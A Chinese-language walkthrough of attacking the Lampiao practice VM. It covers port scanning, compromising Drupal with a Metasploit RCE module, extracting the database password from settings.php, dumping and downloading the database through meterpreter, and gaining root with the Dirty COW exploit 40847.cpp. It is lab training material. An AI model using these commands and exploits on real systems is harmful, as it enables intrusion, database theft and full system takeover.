[TOC]



# ==靶机Lampiao入侵实战==

下载好Lampiao靶机，直接使用VMWare打开其镜像文件即可

## 一、扫描采集信息

### 1、获取IP地址

```
nmap -sn 192.168.230.0/24

获得IP地址位 192.168.230.141
```

### 2、获取端口信息

由于nmap默认情况下只扫描常用的1000个端口，所以建议使用全扫描

```
nmap -p- 192.168.230.141

获得端口号为 22 80 1898
```

> 端口对应版本：
>
> ![image-20240915212351017](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240915212351017.png)
>
> 22号端口：
>
> 使用弱口令爆破工具，无果
>
> ![image-20240915212017852](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240915212017852.png)
>
> 真实环境建议超时时间增大，线程降低

> 80号端口：
>
> ![image-20240915211725575](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240915211725575.png)

> 1898端口：
>
> ![image-20240915212456390](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240915212456390.png)

### 3、获取主机系统信息

```
nmap -O 192.168.230.141
```

![image-20240915211218458](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240915211218458.png)

### 4、扫描漏洞信息

```
nmap --script=vuln 192.168.230.141


Couldn't find
```

### 5、nessus 扫描

![image-20240915211513638](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240915211513638.png)

### 6、目录扫描

`http://192.168.230.141/` 该URL扫描出现问题

![image-20240915214927320](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240915214927320.png)

我们用 fiddler 查看一下什么情况

![image-20240915221002810](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240915221002810.png)

说明该网页不借助nginx或apache等中间件，服务器不做任何头部响应，所以判断会失败

`http://192.168.230.141:1898/` 扫描该URL地址有收获

![image-20240915215846605](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240915215846605.png)

```
一共有以下目录
http://192.168.230.141:1898/includes/
http://192.168.230.141:1898/misc/
http://192.168.230.141:1898/modules/
http://192.168.230.141:1898/profiles/
http://192.168.230.141:1898/scripts/
http://192.168.230.141:1898/sites/
http://192.168.230.141:1898/themes/

```

去先访问一下 php 文件，有可以收集的信息就这一个 /install.php

![image-20240915221552996](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240915221552996.png)

**drupal 是什么？**

由此可以知道，该系统是基于 drupal 开发的

![image-20240915222212180](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240915222212180.png)

再访问一下各个目录，发现有的目录下和php文件只有代码，访问啥都看不到

经过查验发现通过暴露的文件寻找数据库连接密码失败，所以去查找一下durpal中数据库的配置信息在哪个文件

> 1.删除数据库配置文件：/sites/default/settings.php
>
> 2.用浏览器访问本地路径进行安装
>
> 3.安装的时候指定需要配的数据库
>
> /sites/default/settings.php
>
> ```php
> $databases = array (
>   'default' => 
>   array (
>     'default' => 
>     array (
>       'database' => 'ec2china',
>       'username' => 'root',
>       'password' => '',
>       'host' => 'localhost',
>       'port' => '',
>       'driver' => 'mysql',
>       'prefix' => '',
>     ),
>   ),
> ```

![image-20240915223555319](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240915223555319.png)

该页面源代码是纯代码，看不到，想想别的办法

### 7、扫描

nmap 扫描 1898 和 80 端口 漏洞

扫不出来

- ### nessus 扫描

![image-20240915225657848](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240915225657848.png)

![image-20240915225723027](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240915225723027.png)

![image-20240915225745761](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240915225745761.png)

主要这三个地方需要进行设置

扫描结果如下

![image-20240915225853032](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240915225853032.png)

对每一个扫描得到信息进行分析

可知

```
apache 版本信息为
```

![image-20240915230048436](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240915230048436.png)

```
drupal 版本信息为
```

![image-20240915230145239](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240915230145239.png)

### 8、对目标站点从web层面进行测试

- SQL注入漏洞
  - 没结果
- XSS漏洞
  - 对入侵服务器getshell没用，只针对客户有效
- 其他漏洞
  - 由于是基于Drupal框架开发，这种基础漏洞一般没有

## 二、从服务器中间件入手

### 1、apache

```
search apache 2.4
```

![image-20240915232007545](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240915232007545.png)

没有 apache 2.4.99 版本的漏洞

### 2、php

```
search php 5.5
```

没有 php 5.5 本身的对于该系统可用的漏洞

### 3、drupal

```
search drupal
```

![image-20240915233339393](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240915233339393.png)

这次搜索出来有好几个exploit，到底哪一个才是真正能用的。只能一个一个的试

直接 

#### `use 0` 

这个是 远程命令执行RCE的漏洞

![image-20240915233723527](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240915233723527.png)

![image-20240915233858105](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240915233858105.png)

这个漏洞利用失败了

换第二个

#### `use 1`

![image-20240915234220356](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240915234220356.png)

竟然成了

至此成功进入shell

![image-20240915234541936](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240915234541936.png)

## 三、利用Drupal实施入侵

进入shell之后实施拖库，根据Drupal的文件结构，查找到 /var/www/html/sites/default/settings.php 文件，查看数据库链接信息

```
$databases = array (
  'default' => 
  array (
    'default' => 
    array (
      'database' => 'drupal',
      'username' => 'drupaluser',
      'password' => 'Virgulino',
      'host' => 'localhost',
      'port' => '',
      'driver' => 'mysql',
      'prefix' => '',
    ),
  ),
);
```

![image-20240915235312228](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240915235312228.png)

尝试登陆mysql ，注意 该系统的数据库类型不一定就是mysql，需要自我甄别

比如：![image-20240915235703417](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240915235703417.png)

```
mysql -udrupaluser -p
或
mysql -uroot -p

然后输入密码
Virgulino
```

![image-20240915235508029](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240915235508029.png)

但是由于没有交互模式以及命令提示符前缀，所以无法进入mysql交互模式，当exit退出之后才回显，解决办法如下：

方法一：mysql函数实施拖库

不需用进入mysql命令行交互

- `mysqldump -udrupaluser -pVirgulino drupal > drupal.sql`
  - 语法是 `mysqldump -u所导数据库的登录用户名 -p所导数据库的登录用户密码 所导数据库名称 > 导出的sql存储文件名`
- 然后exit 退回到 meterpreter命令行执行 `download /var/www/html/drupal.sql /opt/drupal.sql`

![image-20240916002006124](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240916002006124.png)

![image-20240916001949038](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240916001949038.png)

方法二：python创建命令提示符

- `python -c 'import pty; pty.spawn("/bin/bash")'` 自行创建一个命令提示符
  - ![](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240916000541734.png)

## 四、使用 Dirty-Cow提权

当获取到shell后，第一步便是在 **meterpreter 命令行中使用 getuid** 来查看当前用户的权限。

![image-20240917195206429](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240917195206429.png)

在这里发现是普通用户 www-data ，所以还需要尝试提权。类似于 Windows 的永恒之蓝漏洞一样，Linux 中提权有知名的漏洞 便是 脏牛漏洞 ，尝试从这个方向入手。

> 该漏洞需要自己编译，所以系统环境中需要有 gcc 的环境。如果目标环境中没有 gcc 的环境，我们就需要找一个与目标系统版本尽可能相近的系统，然后再在该系统上手动编译生成一个 漏洞可执行文件，然后上传到目标主机执行。
>
> 该漏洞 searchsploit 中有 ，但是 msf 中没有

### 1、测试目标主机编译环境

```
在 shell 命令行中使用 gcc -v
```

![image-20240917220909453](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240917220909453.png)

发现Lampiao是有gcc环境的

### 2、搜索漏洞

#### （1）在线网站搜索漏洞 searchsploit dirty

#### ![image-20240917221202735](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240917221202735.png)

有很多可利用漏洞

#### （2）msf 中搜索 dirty

![image-20240917221420528](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240917221420528.png)

只有 mac 系统的漏洞

### 3、上传漏洞源代码

由于使用在线网站搜索到的可利用漏洞都是源代码，所以需要上传源代码然后自行编译

![image-20240917221740203](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240917221740203.png)

比较流行的是 /etc/passwd 这种方法。经过验证，linux/local/40847.cpp 方法是可行的，另一个不可行（会直接使目标系统崩溃）

#### （1）查找源代码位置

```
searchsploit -p 40847
```

使用 `searchsploit -p 40847` 查找该源代码存放在kali中何处

![image-20240917223444846](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240917223444846.png)

#### （2）上传源代码

```
进入 meterpreter 命令行，执行
upload /usr/share/exploitdb/exploits/linux/local/40847.cpp /tmp
```

![image-20240917222618566](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240917222618566.png)

由于 系统的 /tmp 目录使临时目录，用户都具有写权限，所以我们上传到这里

```shell
meterpreter > upload /usr/share/exploitdb/exploits/hardware/webapps/40847.cpp /tmp
[*] Uploading  : /usr/share/exploitdb/exploits/hardware/webapps/40847.cpp -> /tmp/40847.cpp
[*] Completed  : /usr/share/exploitdb/exploits/hardware/webapps/40847.cpp -> /tmp/40847.cpp

meterpreter > shell
cd /tmp
ls
40847.cpp
```

### 4、使用gcc编译上传的漏洞源代码

查看源代码中的编译指令

```
cat 40847.cpp 
或 
head -n 10 40847.cpp
```

![image-20240917223832520](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240917223832520.png)

意思是，执行 

```
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
```

对 40847.cpp 进行编译

然后执行

```
./dcow -s
```

即可完成利用

![image-20240917224038376](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240917224038376.png)

至此，提权成功





